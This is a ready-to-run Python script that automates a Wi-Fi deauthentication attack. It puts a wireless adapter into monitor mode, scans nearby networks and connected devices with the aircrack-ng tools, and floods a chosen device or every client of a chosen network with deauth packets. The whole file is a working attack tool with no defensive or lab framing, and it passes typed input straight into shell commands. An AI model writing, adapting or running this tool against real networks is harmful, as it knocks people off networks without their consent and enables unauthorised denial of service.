import os
import subprocess
import re
import time

def check_root():
    """Ensure the script is run as root."""
    if os.geteuid() != 0:
        print("[!] This script must be run as root (sudo). Exiting...")
        exit(1)

def get_wifi_interfaces():
    """Automatically detect available Wi-Fi interfaces."""
    interfaces = []
    output = subprocess.getoutput("iw dev | grep Interface")
    matches = re.findall(r"Interface (\w+)", output)
    
    if matches:
        interfaces.extend(matches)
    else:
        print("[!] No Wi-Fi interfaces detected. Ensure your adapter supports monitor mode.")
        exit(1)

    print("\n[+] Available Wi-Fi Interfaces:")
    for i, iface in enumerate(interfaces, start=1):
        print(f"  {i}. {iface}")
    
    choice = int(input("\nSelect Wi-Fi interface (Enter number): "))
    return interfaces[choice - 1]

def start_monitor_mode(interface):
    """Enable monitor mode on the selected Wi-Fi interface."""
    print(f"[+] Enabling monitor mode on {interface}...")
    os.system(f"airmon-ng start {interface}")
    return f"{interface}mon"

def scan_networks(interface):
    """Scan for nearby Wi-Fi networks and list available targets."""
    print("\n[+] Scanning for available Wi-Fi networks... (Press CTRL+C to stop)\n")
    os.system(f"airodump-ng {interface}")

def list_clients(target_bssid, interface):
    """Scan and list connected clients for a given Wi-Fi network."""
    print("\n[+] Scanning for connected devices on the target network... (Press CTRL+C to stop)\n")
    os.system(f"airodump-ng --bssid {target_bssid} {interface}")

def deauth_attack(target_bssid, target_client, interface):
    """Perform a deauthentication attack on the specified target."""
    if target_client.lower() == "all":
        print(f"\n[⚠] Sending Deauthentication Packets to **ALL** devices on {target_bssid}...")
        os.system(f"aireplay-ng --deauth 1000 -a {target_bssid} {interface}")
    else:
        print(f"\n[⚠] Sending Deauthentication Packets to {target_client} on {target_bssid}...")
        os.system(f"aireplay-ng --deauth 1000 -a {target_bssid} -c {target_client} {interface}")

def stop_monitor_mode(interface):
    """Disable monitor mode after the attack."""
    print("\n[+] Stopping monitor mode...")
    os.system(f"airmon-ng stop {interface}")

if __name__ == "__main__":
    check_root()

    # Auto-detect Wi-Fi interfaces
    wifi_interface = get_wifi_interfaces()

    # Start monitor mode
    monitor_interface = start_monitor_mode(wifi_interface)

    # Scan and list networks
    input("\nPress Enter to start scanning networks...")
    scan_networks(monitor_interface)

    # User selects target Wi-Fi
    target_bssid = input("\nEnter Target Wi-Fi BSSID: ")

    # Scan and list connected clients
    input("\nPress Enter to scan connected clients...")
    list_clients(target_bssid, monitor_interface)

    # User selects target client or "all"
    target_client = input("\nEnter Target Device MAC Address (or type 'all' to disconnect all clients): ")

    # Launch deauth attack
    input("\nPress Enter to launch the deauth attack...")
    deauth_attack(target_bssid, target_client, monitor_interface)

    # Stop monitor mode after attack
    input("\nPress Enter to restore network settings...")
    stop_monitor_mode(monitor_interface)

    print("\n[✔] Attack Completed.")
